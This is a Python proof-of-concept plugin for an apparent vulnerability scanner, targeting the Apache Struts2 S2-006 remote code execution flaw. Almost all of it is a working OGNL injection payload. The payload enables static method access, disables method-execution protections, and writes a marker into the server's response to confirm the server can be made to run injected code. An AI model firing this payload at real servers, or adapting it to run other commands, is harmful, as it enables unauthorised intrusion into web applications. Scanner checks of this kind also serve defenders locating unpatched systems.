#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'Struts2-006'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-006'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)


    def prove(self):
        self.get_url()
        if self.url != None:
            try:
                prove_poc = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@struts2_006_vul@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
                poc_key = '''@struts2_006_vul@'''
                res = self.curl('post',self.url, data=prove_poc).text
                if res and res.find(poc_key) != -1:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": "struts2_006"})
            except:
                pass